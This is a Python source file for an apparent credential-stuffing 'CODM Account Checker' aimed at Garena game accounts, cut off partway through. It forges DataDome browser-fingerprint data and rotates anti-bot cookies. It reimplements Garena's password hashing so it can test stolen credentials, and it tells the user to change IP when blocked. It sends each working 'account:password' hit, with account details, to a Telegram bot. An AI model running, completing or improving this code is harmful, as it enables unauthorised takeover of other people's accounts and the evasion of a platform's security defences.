import warnings
warnings.filterwarnings("ignore", category=DeprecationWarning)
import os
import sys
import time
import random
import hashlib
import json
import logging
import urllib.parse
import signal
import re
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
from threading import Lock
from Crypto.Cipher import AES
import requests
import cloudscraper
import colorama
import threading
from colorama import Fore, Style, Back
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.box import Box, DOUBLE, ROUNDED
from rich.live import Live
from rich.progress import Progress, BarColumn, TextColumn, TimeRemainingColumn, SpinnerColumn
from rich.layout import Layout
from rich.columns import Columns
from rich.text import Text
from rich.progress import Progress

colorama.init(autoreset=True)

console = Console()

class Colors:
    LIGHTGREEN_EX = colorama.Fore.LIGHTGREEN_EX
    WHITE = colorama.Fore.WHITE
    BLUE = colorama.Fore.BLUE
    GREEN = colorama.Fore.GREEN
    RED = colorama.Fore.RED
    CYAN = colorama.Fore.CYAN
    LIGHTBLACK_EX = colorama.Fore.LIGHTBLACK_EX
    RESET = colorama.Style.RESET_ALL 

class ColoredFormatter(logging.Formatter):
    COLORS = {
        'DEBUG': colorama.Fore.BLUE,
        'INFO': colorama.Fore.GREEN,
        'WARNING': colorama.Fore.YELLOW,
        'ERROR': colorama.Fore.RED,
        'CRITICAL': colorama.Fore.RED + colorama.Back.WHITE,
        'ORANGE': '\033[38;5;214m',
        'PURPLE': '\033[95m',
        'CYAN': '\033[96m',
        'SUCCESS': '\033[92m',
        'FAIL': '\033[91m'
    }

    RESET = colorama.Style.RESET_ALL

    def format(self, record):
        levelname = record.levelname
        if levelname in self.COLORS:
            record.msg = f"{self.COLORS[levelname]}{record.msg}{self.RESET}"
        return super().format(record)

logger = logging.getLogger()
handler = logging.StreamHandler()
handler.setFormatter(ColoredFormatter())
logger.addHandler(handler)
logger.setLevel(logging.INFO)

logging.getLogger("urllib3").setLevel(logging.ERROR)
logging.getLogger("requests").setLevel(logging.ERROR)

class GracefulThreadPoolExecutor(ThreadPoolExecutor):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self._shutdown = False
        
    def shutdown(self, wait=True, *, cancel_futures=False):
        self._shutdown = True
        super().shutdown(wait=wait, cancel_futures=cancel_futures)

class CookieManager:
    def __init__(self):
        self.banned_cookies = set()
        self.load_banned_cookies()
        
    def load_banned_cookies(self):
        if os.path.exists('banned_cookies.txt'):
            with open('banned_cookies.txt', 'r') as f:
                self.banned_cookies = set(line.strip() for line in f if line.strip())
    
    def is_banned(self, cookie):
        return cookie in self.banned_cookies
    
    def mark_banned(self, cookie):
        self.banned_cookies.add(cookie)
        with open('banned_cookies.txt', 'a') as f:
            f.write(cookie + '\n')
    
    def get_valid_cookies(self): 
        valid_cookies = []
        if os.path.exists('fresh_cookie.txt'):
            with open('fresh_cookie.txt', 'r') as f:
                valid_cookies = [c.strip() for c in f.read().splitlines() 
                               if c.strip() and not self.is_banned(c.strip())]
        random.shuffle(valid_cookies)
        return valid_cookies
    
    def save_cookie(self, datadome_value):
        formatted_cookie = f"datadome={datadome_value.strip()}" 
        if not self.is_banned(formatted_cookie):
            existing_cookies = set()
            if os.path.exists('fresh_cookie.txt'):
                with open('fresh_cookie.txt', 'r') as f:
                    existing_cookies = set(line.strip() for line in f if line.strip())
                    
            if formatted_cookie not in existing_cookies:
                with open('fresh_cookie.txt', 'a') as f:
                    f.write(formatted_cookie + '\n')
                return True
            return False 
        return False

class DataDomeManager:
    def __init__(self):
        self.current_datadome = None
        self.datadome_history = []
        self._403_attempts = 0
        
    def set_datadome(self, datadome_cookie):
        if datadome_cookie and datadome_cookie != self.current_datadome:
            self.current_datadome = datadome_cookie
            self.datadome_history.append(datadome_cookie)
            if len(self.datadome_history) > 10:
                self.datadome_history.pop(0)
            
    def get_datadome(self):
        return self.current_datadome
        
    def extract_datadome_from_session(self, session):
        try:
            cookies_dict = session.cookies.get_dict()
            datadome_cookie = cookies_dict.get('datadome')
            if datadome_cookie:
                self.set_datadome(datadome_cookie)
                return datadome_cookie
            return None
        except Exception as e:
            logger.warning(f"[WARNING] Error extracting datadome from session: {e}")
            return None
        
    def clear_session_datadome(self, session):
        try:
            if 'datadome' in session.cookies:
                del session.cookies['datadome']
        except Exception as e:
            logger.warning(f"[WARNING] Error clearing datadome cookies: {e}")
        
    def set_session_datadome(self, session, datadome_cookie=None):
        try:
            self.clear_session_datadome(session)
            cookie_to_use = datadome_cookie or self.current_datadome
            if cookie_to_use:
                session.cookies.set('datadome', cookie_to_use, domain='.garena.com')
                return True
            return False
        except Exception as e:
            logger.warning(f"[WARNING] Error setting datadome cookie: {e}")
            return False

    def get_current_ip(self):
        ip_services = [
            'https://api.ipify.org',
            'https://icanhazip.com',
            'https://ident.me',
            'https://checkip.amazonaws.com'
        ]
        
        for service in ip_services:
            try:
                response = requests.get(service, timeout=10)
                if response.status_code == 200:
                    ip = response.text.strip()
                    if ip and '.' in ip:  
                        return ip
            except Exception:
                continue
        
        logger.warning(f"[WARNING] Could not fetch IP from any service")
        return None

    def wait_for_ip_change(self, session, check_interval=5, max_wait_time=200):
        logger.info(f"[𝙄𝙉𝙁𝙊] Auto-detecting IP change...")
        
        original_ip = self.get_current_ip()
        if not original_ip:
            logger.warning(f"[WARNING] Could not determine current IP, waiting 60 seconds")
            time.sleep(10)
            return True
            
        logger.info(f"[𝙄𝙉𝙁𝙊] Current IP: {original_ip}")
        logger.info(f"[𝙄𝙉𝙁𝙊] Waiting for IP change (checking every {check_interval} seconds, max {max_wait_time//60} minutes)...")
        
        start_time = time.time()
        attempts = 0
        
        while time.time() - start_time < max_wait_time:
            attempts += 1
            current_ip = self.get_current_ip()
            
            if current_ip and current_ip != original_ip:
                logger.info(f"[SUCCESS] IP changed from {original_ip} to {current_ip}")
                logger.info(f"[𝙄𝙉𝙁𝙊] IP changed successfully after {attempts} checks!")
                return True
            else:
                if attempts % 5 == 0:  
                    logger.info(f"[𝙄𝙉𝙁𝙊] IP check {attempts}: Still {original_ip} -> Auto-retrying...")
                time.sleep(check_interval)
        
        logger.warning(f"[WARNING] IP did not change after {max_wait_time} seconds")
        return False

    def handle_403(self, session):
        self._403_attempts += 1
        
        if self._403_attempts >= 3:
            logger.error(f"[ERROR] IP blocked after 3 attempts.")
            logger.error(f"[𝙄𝙉𝙁𝙊] Network fix: WiFi -> Use VPN | Mobile Data -> Toggle Airplane Mode")
            logger.info(f"[𝙄𝙉𝙁𝙊] Auto-detecting IP change...")
            
            if self.wait_for_ip_change(session):
                logger.info(f"[SUCCESS] IP changed, fetching new DataDome cookie...")
                
                self._403_attempts = 0
                
                new_datadome = get_datadome_cookie(session)
                if new_datadome:
                    self.set_datadome(new_datadome)
                    logger.info(f"[SUCCESS] New DataDome cookie obtained")
                    return True
                else:
                    logger.error(f"[ERROR] Failed to fetch new DataDome after IP change")
                    return False
            else:
                logger.error(f"[ERROR] IP did not change, cannot continue")
                return False
        return False

class TelegramBot:
    def __init__(self, bot_token, chat_id):
        self.bot_token = bot_token
        self.chat_id = chat_id
        self.base_url = f"https://api.telegram.org/bot{bot_token}"
        
    def send_message(self, message):
        try:
            url = f"{self.base_url}/sendMessage"
            payload = {
                'chat_id': self.chat_id,
                'text': message,
                'parse_mode': 'HTML'
            }
            response = requests.post(url, data=payload, timeout=10)
            if response.status_code == 200:
                return True
            else:
                logger.error(f"[TELEGRAM] Failed to send message: {response.status_code}")
                return False
        except Exception as e:
            logger.error(f"[TELEGRAM] Error sending message: {e}")
            return False
    
    def send_hit(self, account, password, details, codm_info, shells_balance):
        try:
            # Format the hit message
            message = f"<b>🎯 NEW CODM HIT FOUND!</b>\n\n"
            message += f"<b>👤 Account:</b> <code>{account}:{password}</code>\n"
            
            if codm_info:
                message += f"<b>🎮 CODM Nickname:</b> {codm_info.get('codm_nickname', 'N/A')}\n"
                message += f"<b>⭐ Level:</b> {codm_info.get('codm_level', 'N/A')}\n"
                message += f"<b>🆔 UID:</b> <code>{codm_info.get('uid', 'N/A')}</code>\n"
                message += f"<b>🌍 Region:</b> {codm_info.get('region', 'N/A')}\n"
            
            message += f"<b>💰 Shells:</b> {shells_balance}\n"
            message += f"<b>📍 Country:</b> {details['personal']['country']}\n"
            
            if details['is_clean']:
                message += f"<b>✅ Status:</b> <b>CLEAN</b>\n"
            else:
                message += f"<b>❌ Status:</b> <b>NOT CLEAN</b>\n"
                if details['binds']:
                    message += f"<b>🔗 Binds:</b> {', '.join(details['binds'])}\n"
            
            # Add timestamp
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            message += f"\n<code>⏰ {timestamp}</code>\n"
            message += f"<code>📱 Config By: @MercyNot1</code>"
            
            return self.send_message(message)
        except Exception as e:
            logger.error(f"[TELEGRAM] Error formatting hit: {e}")
            return False
    
    def send_stats(self, total_accounts, checked, valid, invalid, clean, not_clean, time_taken):
        try:
            message = f"<b>📊 CHECKER COMPLETED!</b>\n\n"
            message += f"<b>📁 Total Accounts:</b> {total_accounts}\n"
            message += f"<b>✅ Checked:</b> {checked}\n"
            message += f"<b>🎯 CODM Valid:</b> {valid}\n"
            message += f"<b>❌ CODM Invalid:</b> {invalid}\n"
            message += f"<b>✨ CLEAN:</b> {clean}\n"
            message += f"<b>🔗 NOT CLEAN:</b> {not_clean}\n"
            message += f"<b>⏱️ Time Taken:</b> {time_taken}\n"
            message += f"\n<code>🎮 CODM Account Checker</code>\n"
            message += f"<code>⚙️ Config By: @MercyNot1</code>"
            
            return self.send_message(message)
        except Exception as e:
            logger.error(f"[TELEGRAM] Error sending stats: {e}")
            return False

class LiveStatsDisplay:
    def __init__(self, total_accounts):
        self.total_accounts = total_accounts
        self.checked = 0
        self.valid = 0
        self.invalid = 0
        self.has_codm = 0
        self.no_codm = 0
        self.not_clean_codm = 0
        self.clean_codm = 0
        self.start_time = time.time()
        self.lock = threading.Lock()
        
        # Create progress bar
        self.progress = Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            BarColumn(),
            TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
            TextColumn("•"),
            TextColumn("[cyan]{task.completed}/{task.total}"),
            TextColumn("•"),
            TimeRemainingColumn(),
            console=console
        )
        self.task_id = self.progress.add_task("[cyan]Checking Accounts...", total=total_accounts)
        
    def update(self, valid=False, has_codm=False, clean=False):
        with self.lock:
            self.checked += 1
            if valid:
                self.valid += 1
                if has_codm:
                    self.has_codm += 1
                    if clean:
                        self.clean_codm += 1
                    else:
                        self.not_clean_codm += 1
                else:
                    self.no_codm += 1
            else:
                self.invalid += 1
            self.progress.update(self.task_id, advance=1)
    
    def get_live_stats_box(self):
        """Create the LIVE STATS box with the requested format"""
        with self.lock:
            # Calculate progress bar
            percentage = (self.checked / self.total_accounts * 100) if self.total_accounts > 0 else 0
            filled_width = int(percentage / 2)  # 50 characters = 100%
            progress_bar = "█" * filled_width + "░" * (50 - filled_width)
            
            # Format time
            elapsed = time.time() - self.start_time
            time_str = self.format_time(elapsed)
            
            # Create the stats box
            stats_text = f"[bold cyan]{progress_bar}[/bold cyan]\n"
            stats_text += f"[bold cyan]{percentage:>3.0f}% • {self.checked}/{self.total_accounts} • {time_str}[/bold cyan]\n\n"
            stats_text += f"[bold white]Valid:[/bold white]    [green]{self.valid:>4}[/green]   "
            stats_text += f"[bold white]Invalid:[/bold white]   [red]{self.invalid:>4}[/red]\n"
            stats_text += f"[bold white]Has Codm:[/bold white]  [green]{self.has_codm:>4}[/green]   "
            stats_text += f"[bold white]No Codm:[/bold white]   [yellow]{self.no_codm:>4}[/yellow]\n"
            stats_text += f"[bold white]Not Clean Codm:[/bold white] [red]{self.not_clean_codm:>4}[/red]   "
            stats_text += f"[bold white]Clean Codm:[/bold white] [green]{self.clean_codm:>4}[/green]"
            
            return Panel(
                stats_text,
                title="[bold cyan]LIVE STATS[/bold cyan]",
                border_style="cyan",
                box=ROUNDED,
                padding=(1, 2)
            )
    
    def format_time(self, seconds):
        if seconds < 60:
            return f"{seconds:.0f}s"
        elif seconds < 3600:
            minutes = seconds // 60
            seconds = seconds % 60
            return f"{int(minutes):02d}:{int(seconds):02d}"
        else:
            hours = seconds // 3600
            minutes = (seconds % 3600) // 60
            seconds = seconds % 60
            return f"{int(hours):02d}:{int(minutes):02d}:{int(seconds):02d}"
    
    def get_final_stats(self):
        elapsed = time.time() - self.start_time
        return {
            'total': self.total_accounts,
            'checked': self.checked,
            'valid': self.valid,
            'invalid': self.invalid,
            'has_codm': self.has_codm,
            'no_codm': self.no_codm,
            'not_clean_codm': self.not_clean_codm,
            'clean_codm': self.clean_codm,
            'time_taken': self.format_time(elapsed)
        }

def encode(plaintext, key):
    key = bytes.fromhex(key)
    plaintext = bytes.fromhex(plaintext)
    cipher = AES.new(key, AES.MODE_ECB)
    ciphertext = cipher.encrypt(plaintext)
    return ciphertext.hex()[:32]

def get_passmd5(password):
    decoded_password = urllib.parse.unquote(password)
    return hashlib.md5(decoded_password.encode('utf-8')).hexdigest()

def hash_password(password, v1, v2):
    passmd5 = get_passmd5(password)
    inner_hash = hashlib.sha256((passmd5 + v1).encode()).hexdigest()
    outer_hash = hashlib.sha256((inner_hash + v2).encode()).hexdigest()
    return encode(passmd5, outer_hash)

def applyck(session, cookie_str):
    session.cookies.clear()
    cookie_dict = {}
    for item in cookie_str.split(";"):
        item = item.strip()
        if '=' in item:
            try:
                key, value = item.split("=", 1)
                key = key.strip()
                value = value.strip()
                if key and value:
                    cookie_dict[key] = value 
            except (ValueError, IndexError):
                logger.warning(f"[WARNING] Skipping invalid cookie component: {item}")
        else:
            logger.warning(f"[WARNING] Skipping malformed cookie (no '='): {item}")
    
    if cookie_dict:
        session.cookies.update(cookie_dict)
        logger.info(f"[SUCCESS] Applied {len(cookie_dict)} unique cookie keys to session.")
    else:
        logger.warning(f"[WARNING] No valid cookies found in the provided string")

def get_datadome_cookie(session):
    url = 'https://dd.garena.com/js/'
    headers = {
        'accept': '*/*',
        'accept-encoding': 'gzip, deflate, br, zstd',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'no-cache',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://account.garena.com',
        'pragma': 'no-cache',
        'referer': 'https://account.garena.com/',
        'sec-ch-ua': '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36'
    }
    
    payload = {
        "jsData": json.dumps({"ttst": 76.70000004768372, "ifov": False, "hc": 4, "br_oh": 824, "br_ow": 1536, "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36", "wbd": False, "dp0": True, "tagpu": 5.738121195951787, "wdif": False, "wdifrm": False, "npmtm": False, "br_h": 738, "br_w": 260, "isf": False, "nddc": 1, "rs_h": 864, "rs_w": 1536, "rs_cd": 24, "phe": False, "nm": False, "jsf": False, "lg": "en-US", "pr": 1.25, "ars_h": 824, "ars_w": 1536, "tz": -480, "str_ss": True, "str_ls": True, "str_idb": True, "str_odb": False, "plgod": False, "plg": 5, "plgne": True, "plgre": True, "plgof": False, "plggt": False, "pltod": False, "hcovdr": False, "hcovdr2": False, "plovdr": False, "plovdr2": False, "ftsovdr": False, "ftsovdr2": False, "lb": False, "eva": 33, "lo": False, "ts_mtp": 0, "ts_tec": False, "ts_tsa": False, "vnd": "Google Inc.", "bid": "NA", "mmt": "application/pdf,text/pdf", "plu": "PDF Viewer,Chrome PDF Viewer,Chromium PDF Viewer,Microsoft Edge PDF Viewer,WebKit built-in PDF", "hdn": False, "awe": False, "geb": False, "dat": Fa
